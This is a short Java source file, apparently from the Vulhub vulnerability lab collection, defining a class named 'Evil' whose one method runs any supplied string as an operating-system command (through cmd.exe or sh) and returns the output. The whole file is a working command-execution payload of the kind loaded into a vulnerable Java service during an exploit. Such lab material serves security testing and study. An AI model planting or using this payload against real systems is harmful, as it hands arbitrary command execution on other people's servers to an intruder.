package org.vulhub;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

public class Evil {
    public Evil() {}

    public String customMethod(String cmd) {
        List<String> result = new ArrayList();

        try {
            ProcessBuilder b;
            String os = System.getProperty("os.name").toLowerCase();
            if (os.contains("win")) {
                b = new ProcessBuilder("cmd.exe", "/c", cmd);
            } else {
                b = new ProcessBuilder("sh", "-c", cmd);
            }

            Process process = b.start();
            process.waitFor();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line = "";
            while((line = bufferedReader.readLine()) != null) {
                result.add(line);
            }

            bufferedReader.close();
        } catch (Exception e) {
            result.add(e.getMessage());
        }

        return String.join("\n", result);
    }
}